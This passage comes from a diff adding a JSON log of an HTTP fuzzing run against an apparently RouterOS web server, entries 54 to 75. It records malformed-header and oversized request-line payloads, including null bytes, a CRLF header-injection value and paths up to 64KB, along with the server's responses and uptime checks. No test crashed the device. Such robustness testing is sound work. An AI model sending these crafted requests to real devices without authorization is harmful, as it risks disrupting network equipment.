+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:17 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h4m59s",
+        "uptime_after": "2h4m59s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 54,
+      "category": "malformed_headers",
+      "name": "Missing colon in header",
+      "description": "Send header line without colon separator",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:27.607333",
+      "details": {
+        "payload_size": 73,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nBadHeaderNoColon\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:17 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m",
+        "uptime_after": "2h5m5s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 55,
+      "category": "malformed_headers",
+      "name": "Null byte in header name",
+      "description": "Send header with null byte embedded in name",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:28.418927",
+      "details": {
+        "payload_size": 75,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Null\u0000Name: value\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:23 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:23 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m6s",
+        "uptime_after": "2h5m6s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 56,
+      "category": "malformed_headers",
+      "name": "Null byte in header value",
+      "description": "Send header with null byte embedded in value",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:29.226523",
+      "details": {
+        "payload_size": 71,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Test: val\u0000ue\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:24 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:24 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m6s",
+        "uptime_after": "2h5m7s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 57,
+      "category": "malformed_headers",
+      "name": "CRLF injection in header value",
+      "description": "Inject CRLF sequence inside header value to split headers",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:30.050111",
+      "details": {
+        "payload_size": 95,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Inject: value\r\nInjected-Header: evil\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:25 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:25 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m7s",
+        "uptime_after": "2h5m8s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 58,
+      "category": "malformed_headers",
+      "name": "Header with empty value",
+      "description": "Send header with name but no value after colon",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:30.865703",
+      "details": {
+        "payload_size": 65,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Empty:\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:26 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:26 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m8s",
+        "uptime_after": "2h5m8s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 59,
+      "category": "malformed_headers",
+      "name": "Header with only colon",
+      "description": "Send header line that is just a colon",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:31.689291",
+      "details": {
+        "payload_size": 58,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n:\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:27 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:27 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m9s",
+        "uptime_after": "2h5m9s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 60,
+      "category": "malformed_headers",
+      "name": "Very long header name (4096B)",
+      "description": "Send header with a 4096-byte name",
+      "result": "Response: HTTP/1.0 400 Bad Request (653 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:32.508881",
+      "details": {
+        "payload_size": 4160,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX... [truncated, total 4160 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:27 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\nHTTP/1.0 503 Service Unavailable\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 109\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:27 GMT\r\nExpires: 0\r\nPragm... [truncated, total 653 chars]",
+        "error": null,
+        "uptime_before": "2h5m10s",
+        "uptime_after": "2h5m10s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 61,
+      "category": "malformed_headers",
+      "name": "Very long header name (16384B)",
+      "description": "Send header with a 16384-byte name",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:33.332469",
+      "details": {
+        "payload_size": 16448,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX... [truncated, total 16448 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:28 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m10s",
+        "uptime_after": "2h5m11s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 62,
+      "category": "malformed_headers",
+      "name": "Tab in header name",
+      "description": "Send header with tab character in name",
+      "result": "Response: HTTP/1.1 200 OK (1504 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:34.148061",
+      "details": {
+        "payload_size": 74,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nX-Tab\tName: value\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 200 OK\r\nCache-Control: max-age=31536000\r\nConnection: close\r\nContent-Length: 1280\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:29 GMT\r\nExpires: Tue, 16 Feb 2027 21:44:29 GMT\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=\"en\">\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<link rel=\"icon\" href=\"/favicon.png\">\n<link rel=\"icon\" href=\"/favicon.svg\">\n<title>RouterOS</title>\n<link rel=\"stylesheet\" href=\"/assets/style-ae67df16... [truncated, total 1503 chars]",
+        "error": null,
+        "uptime_before": "2h5m11s",
+        "uptime_after": "2h5m12s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 63,
+      "category": "malformed_headers",
+      "name": "Header with only spaces",
+      "description": "Send header line consisting of spaces and colon",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:39.964111",
+      "details": {
+        "payload_size": 68,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\n     :     \r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:30 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m12s",
+        "uptime_after": "2h5m17s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 64,
+      "category": "request_line",
+      "name": "Long URL path (256B)",
+      "description": "Send GET request with 256-byte URL path",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:40.804531",
+      "details": {
+        "payload_size": 310,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection:... [truncated, total 310 chars]",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:36 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m18s",
+        "uptime_after": "2h5m18s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 65,
+      "category": "request_line",
+      "name": "Long URL path (512B)",
+      "description": "Send GET request with 512-byte URL path",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:41.612935",
+      "details": {
+        "payload_size": 566,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 566 chars]",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:36 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m19s",
+        "uptime_after": "2h5m19s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 66,
+      "category": "request_line",
+      "name": "Long URL path (1024B)",
+      "description": "Send GET request with 1024-byte URL path",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:42.421339",
+      "details": {
+        "payload_size": 1078,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 1078 chars]",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:37 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m20s",
+        "uptime_after": "2h5m20s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 67,
+      "category": "request_line",
+      "name": "Long URL path (2048B)",
+      "description": "Send GET request with 2048-byte URL path",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:43.225741",
+      "details": {
+        "payload_size": 2102,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 2102 chars]",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:38 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m20s",
+        "uptime_after": "2h5m21s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 68,
+      "category": "request_line",
+      "name": "Long URL path (4096B)",
+      "description": "Send GET request with 4096-byte URL path",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:44.034145",
+      "details": {
+        "payload_size": 4150,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 4150 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:39 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m21s",
+        "uptime_after": "2h5m22s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 69,
+      "category": "request_line",
+      "name": "Long URL path (8192B)",
+      "description": "Send GET request with 8192-byte URL path",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:44.838547",
+      "details": {
+        "payload_size": 8246,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 8246 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:40 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m22s",
+        "uptime_after": "2h5m22s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 70,
+      "category": "request_line",
+      "name": "Long URL path (16384B)",
+      "description": "Send GET request with 16384-byte URL path",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:45.642949",
+      "details": {
+        "payload_size": 16438,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 16438 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:40 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m23s",
+        "uptime_after": "2h5m23s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 71,
+      "category": "request_line",
+      "name": "Long URL path (65536B)",
+      "description": "Send GET request with 65536-byte URL path",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:46.447351",
+      "details": {
+        "payload_size": 65590,
+        "payload_preview": "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated, total 65590 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:41 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m24s",
+        "uptime_after": "2h5m24s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 72,
+      "category": "request_line",
+      "name": "Long HTTP version string (4KB)",
+      "description": "Send request with oversized HTTP version field",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:47.255755",
+      "details": {
+        "payload_size": 4148,
+        "payload_preview": "GET / HTTP/1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111... [truncated, total 4148 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:42 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m24s",
+        "uptime_after": "2h5m25s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 73,
+      "category": "request_line",
+      "name": "Long method name (4KB)",
+      "description": "Send request with 4096-byte HTTP method",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:48.064159",
+      "details": {
+        "payload_size": 4148,
+        "payload_preview": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX... [truncated, total 4148 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:43 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m25s",
+        "uptime_after": "2h5m26s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 74,
+      "category": "request_line",
+      "name": "Spaces in URL path",
+      "description": "Send GET with spaces embedded in URL (no encoding)",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:48.872563",
+      "details": {
+        "payload_size": 76,
+        "payload_preview": "GET /path with spaces/file HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:44 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m26s",
+        "uptime_after": "2h5m26s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 75,
+      "category": "request_line",
+      "name": "Null byte in URL path",
+      "description": "Send GET with null byte embedded in URL path",
+      "result": "Response: HTTP/1.1 404 Not Found (310 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:04:49.684969",
+      "details": {
+        "payload_size": 70,
+        "payload_preview": "GET /path\u0000/traversal HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n\r\n",
+        "response_preview": "HTTP/1.1 404 Not Found\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 99\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:44:45 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "error": null,
+        "uptime_before": "2h5m27s",
+        "uptime_after": "2h5m27s",
+        "crashed": false
+      }
+    },
+    {
